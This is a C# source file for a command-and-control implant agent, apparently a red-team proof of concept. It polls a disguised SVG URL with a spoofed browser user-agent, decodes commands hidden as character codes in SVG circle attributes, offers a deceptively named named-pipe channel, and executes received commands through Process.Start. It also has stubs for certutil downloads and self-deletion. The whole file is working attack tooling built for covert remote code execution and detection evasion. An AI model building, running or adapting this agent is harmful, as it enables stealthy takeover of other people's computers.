using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.Json;
using System.Threading.Tasks;
using System.Net;
using System.IO.Pipes;
using System.Xml;

public class C2Command
{
    public required string ModuleName { get; set; }
    public required string ModuleTask { get; set; }
    public required string TaskOptions { get; set; }
    public bool HasErrors { get; set; }
}

public class C2Pac
{
    //  HTTP C2 variables
    private static readonly HttpClient client = new HttpClient();
    static string url = "http://<updateme>.com/something/dontbesuspicious.svg";

    static string customUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36";
    static string? customHeaderProperty = null;
    static string? customHeaderValue = null;

    //  Named Pipe C2 variables
    static string c2PipeServer = ".";
    static string c2PipeName = "Winsock2\\CatalogChangeListener-182a";

    //  SVG C2 variables
    public static string nodeXPath = "//svg:circle|//svg:ellipse";

    //  Agent configuration variables
    static char commandDelimiter = ':';
    static int retrieveInterval = 30000;
    static bool debugMode = false;
    public static async Task Main(string[] args)
    {
        Console.WriteLine("[*] Starting C2 agent");
        
        Console.WriteLine("[*] Querying C2 endpoint...");
        
        while (true)
        {
            string c2Command = await RetrieveCommand();
            if (c2Command == null)
            {
                Console.WriteLine("[!] ERROR: Unable to retrieve command, check C2 endpoint.");
                System.Environment.Exit(-1);
            }
            else
            {
                Console.WriteLine("[*] Parsing C2 command");
                //  extract command string from response
                C2Command parsedCmd = ParseCommand(c2Command);
                Console.WriteLine("[*] Executing C2 command");
                //  execute the command
                int cmdResult = ExecuteCommand(parsedCmd);
                if (cmdResult > 0)
                {
                    Console.WriteLine("[!] ERROR: ExecuteCommand failed.");
                }
                else
                {
                    Console.WriteLine("[*] ExecuteCommand Succesful.");
                }
            }
            Thread.Sleep(retrieveInterval);
        }
    }

    // this is where we swap out the C2 channel
    public static async Task<string> RetrieveCommand()
    {
        //  HTTP GET example
        //string command = await RetrieveCommandFromHTTPGet();

        //  Named Pipe example
        //string command = RetrieveFromNamedPipe(c2PipeServer, c2PipeName);

        // SVG example
        string c2svg = await RetrieveCommandFromHTTPGet(url);
        string command = RetrieveFromSVG(c2svg);

        //  return the command for parsing and execution
        return command;
    }

    //  parse raw string into C2Command object
    public static C2Command ParseCommand(string inputCommand)
    {
        string[] splitCommand = inputCommand.Split(commandDelimiter);

        if (debugMode)
        {
            Console.WriteLine("[*] Dumping inputCommand values:");
            foreach (string commandElement in splitCommand)
            {
                Console.WriteLine(commandElement);
            }
        }

        string moduleName = splitCommand[0];
        string moduleTask = splitCommand[1];
        string moduleOptions = splitCommand[2];

        if (debugMode)
        {
            Console.WriteLine($"Module Name: {moduleName}");
            Console.WriteLine($"Module Task: {moduleTask}");
            Console.WriteLine($"Module Options: {moduleOptions}");
        }

        return new C2Command
        {
            ModuleName = moduleName,
            ModuleTask = moduleTask,
            TaskOptions = moduleOptions
        };
    }

    //  parse the command values and call the appropriate module
    public static int ExecuteCommand(C2Command inputValues)
    {
        //  parse the ModuleName and call the corresponding function
        if (inputValues.ModuleName == "rce")
        {
            if (debugMode)
            {
                Console.WriteLine("[*] Executing module: RCE");
            }

            int result = RceModule(inputValues.ModuleTask, inputValues.TaskOptions);
            if (result >= 0)
            {
                Console.WriteLine("[*] Successful execution of RCE module.");
            }
            else
            {
                Console.WriteLine("[!] ERROR: Unrecognized task.");
            }
        }
        else if (inputValues.ModuleName == "exit")
        {
            if (debugMode)
            {
                Console.WriteLine("[*] Executing module: Exit");
            }
            ExitModule(inputValues.ModuleTask, inputValues.TaskOptions);
        }
        else
        {
            Console.WriteLine("[!] ERROR: Unrecognized module.");
        }
        return 0;
    }

    //  remote code exection tasks
    public static int RceModule(string task, string options)
    {
        if (task == "cmd")
        {
            if (debugMode)
            {
                Console.WriteLine("Executing task: CMD");
            }

            // additional processing of command line arguments
            if (options.Contains(' '))
            {
                int argumentsIndex = options.IndexOf(' ');
                string commandValue = options.Substring(0, argumentsIndex);
                string argumentsValue = options.Substring(argumentsIndex + 1);

                if (argumentsValue != null)
                {
                    Process.Start(commandValue, argumentsValue);
                }
                else
                {
                    Process.Start(commandValue);
                }
            }
            else
            {
                if (debugMode)
                {
                    Console.WriteLine("No arguments provided.");
                }
                Process.Start(options);
            }
            return 0;
        }
        else
        {
            return -1;
        }
    }

    // download tasks
    public static int DownloadModule(string task, string options)
    {
        if (task == "client")
        {
            if (debugMode)
            {
                Console.WriteLine("Initiating download using TCP client");
            }
            return 0;
        }
        else if (task == "certutil")
        {
            Console.WriteLine("Initiating download using certutil.exe");
            return 0;
        }
        else
        {
            return -1;
        }
    }

    // exit tasks
    public static void ExitModule(string task, string options)
    {
        if (task == "quit")
        {
            if (debugMode)
            {
                Console.WriteLine("[*] Recieved an EXIT task");
            }

            if (options == "now")
            {
                Console.WriteLine("[*] Exiting process now.");
                System.Environment.Exit(0);
            }
            else if (options == "remove")
            {
                //  drop delete script, which deletes this executable after a short wait
                //  invoke delete script
                //  terminate the current processs
                Console.WriteLine("[*] TODO: Add code to remove, exiting now.");
                System.Environment.Exit(0);
            }
            else
            {
                try
                {
                    int millisecondsToWait = Convert.ToInt32(options);
                    Console.WriteLine($"[*] Sleeping for: {millisecondsToWait}");
                    Thread.Sleep(millisecondsToWait);
                    Console.WriteLine("[*] Exiting process now.");
                    System.Environment.Exit(0);
                }
                catch (Exception)
                {
                    Console.WriteLine("[!] ERROR: Exception when parsing the delay.");
                    Console.WriteLine("[*] Exiting process now.");
                    System.Environment.Exit(0);
                }
            }
        }
    }

    // HTTP GET PoC
    public static async Task<string> RetrieveCommandFromHTTPGet(string url)
    {
        try
        {
            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
            if (customUserAgent != null)
            {
                request.Headers.Add("User-Agent", customUserAgent);
            }
            if ((customHeaderProperty != null) && (customHeaderValue != null))
            {
                request.Headers.Add(customHeaderProperty, customHeaderValue);
            }

            //request.Headers.Add("Accept", "application/json");

            HttpResponseMessage response = await client.SendAsync(request);
            response.EnsureSuccessStatusCode();
            //  need to include processing for a failed HTTP status code

            string responseBody = await response.Content.ReadAsStringAsync();
            return responseBody;
        }
        catch (HttpRequestException e)
        {
            Console.WriteLine($"[!] ERROR: Request exception: {e.Message}");
            return "Exception";
        }
        catch (Exception e)
        {
            Console.WriteLine($"[!] ERROR: An unexpected error occurred: {e.Message}");
            return "Exception";
        }
    }

    //  Named Pipe PoC
    public static string RetrieveFromNamedPipe(string pipeServer, string pipeName)
    {
        int timeoutMilliseconds = 5000; // 5 seconds timeout
        string? inputCommand = null;
        using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeServer, pipeName, PipeDirection.In))
        {
            // Connect to the pipe or wait until the pipe is available.
            Console.WriteLine("[>] Attempting to connect to pipe...");
            try
            {
                pipeClient.Connect(timeoutMilliseconds);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] ERROR: Pipe connection failed with exception: {0}", ex.Message);
                return null;
            }

            Console.WriteLine("[>] Connected to pipe.");

            if (pipeClient.IsConnected)
            {
                try
                {
                    using (StreamReader sr = new StreamReader(pipeClient))
                    {
                        // Display the read text to the console
                        inputCommand = sr.ReadLine();
                        if (inputCommand != null)
                        {
                            Console.WriteLine("[>] Received command from server: {0}", inputCommand);
                            pipeClient.Dispose();
                            Console.WriteLine("[>] Disconnected from pipe.");
                            return inputCommand;
                        }
                        else
                        {
                            return null;
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[!] ERROR: Caught exception: {0}", e.Message);
                    return null;
                }
            }
            else
            {
                Console.WriteLine("[!] ERROR: Failed to connect to pipe!");
                return null;
            }
        }
    }

    public static string RetrieveFromSVG(string svgString)
    {
        XmlDocument doc = new XmlDocument();
        try
        {
            doc.LoadXml(svgString);

            // configure namespace
            XmlNamespaceManager nsmgr = new XmlNamespaceManager(doc.NameTable);
            nsmgr.AddNamespace("svg", "http://www.w3.org/2000/svg");

            // select control nodes
            XmlNodeList codedNodes = doc.SelectNodes(nodeXPath, nsmgr);

            if (codedNodes != null && codedNodes.Count > 0)
            {
                //Console.WriteLine($"Found {codedNodes.Count} coded element(s) in the SVG:");

                string myString = "";
                System.Text.StringBuilder sb = new System.Text.StringBuilder(myString);

                foreach (XmlNode codeNode in codedNodes)
                {
                    if (codeNode != null)
                    {
                        // cast to XmlElement for easier access to attributes
                        XmlElement codeElement = codeNode as XmlElement;
                        if (codeElement != null)
                        {
                            if (codeElement.HasAttribute("cx"))
                            {
                                int characterCode1 = int.Parse(codeElement.GetAttribute("cx"));
                                char character1 = (char)characterCode1;
                                //Console.WriteLine($"  cx: {codeElement.GetAttribute("cx")}");
                                Console.Write(character1);
                                sb.Append(character1);
                            }

                            if (codeElement.HasAttribute("cy"))
                            {
                                int characterCode2 = int.Parse(codeElement.GetAttribute("cy"));
                                char character2 = (char)characterCode2;                                
                                //Console.WriteLine($"  cy: {codeElement.GetAttribute("cy")}");
                                //Console.Write(character2);
                                sb.Append(character2);
                            }

                            if (codeElement.HasAttribute("r"))
                            {
                                int characterCode3 = int.Parse(codeElement.GetAttribute("r"));
                                char character3 = (char)characterCode3;
                                //Console.WriteLine($"  r:  {codeElement.GetAttribute("r")}");
                                //Console.Write(character3);
                                sb.Append(character3);
                            }
                        }
                    }
                }
                //Console.WriteLine(sb.ToString());   
                return sb.ToString();
            }
            else
            {
                Console.WriteLine("No coded elements found in the SVG (check XPath or namespaces).");
                return null;
            }
        }
        catch (XmlException ex)
        {
            Console.WriteLine($"Error loading XML: {ex.Message}");
            return null;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An unexpected error occurred: {ex.Message}");
            return null;
        }
    }    
}
